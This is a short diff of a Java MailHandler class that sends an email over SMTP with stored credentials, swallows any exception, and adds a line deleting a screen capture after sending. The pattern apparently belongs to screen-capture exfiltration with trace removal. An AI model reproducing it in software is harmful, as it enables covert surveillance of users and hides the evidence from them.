@@ -87,6 +87,7 @@ public final class MailHandler {
 			transport.connect(d_host, 465, d_uname, d_password);
 			transport.sendMessage(msg, msg.getAllRecipients());
 			transport.close();
+			ScreenCapture.delete();
 		}catch(Exception e) {
 			
 		}
